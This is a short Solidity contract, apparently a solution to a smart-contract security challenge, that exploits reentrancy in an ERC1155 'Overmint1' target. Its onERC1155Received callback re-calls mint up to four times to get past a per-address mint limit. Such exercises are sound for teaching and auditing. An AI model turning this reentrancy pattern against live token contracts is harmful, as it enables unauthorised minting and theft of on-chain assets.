// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";
import "../Overmint1-ERC1155.sol";

contract AttackContract is ERC1155Holder {
    Overmint1_ERC1155 public target;
    uint256 public mintCount;
    
    constructor(address _target) {
        target = Overmint1_ERC1155(_target);
    }
    
    function attack() external {
        // Call mint multiple times using reentrancy
        target.mint(0, "");
    }
    
    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes memory
    ) public virtual override returns (bytes4) {
        if(mintCount < 4) {
            mintCount++;
            target.mint(0, "");
        }
        return this.onERC1155Received.selector;
    }
}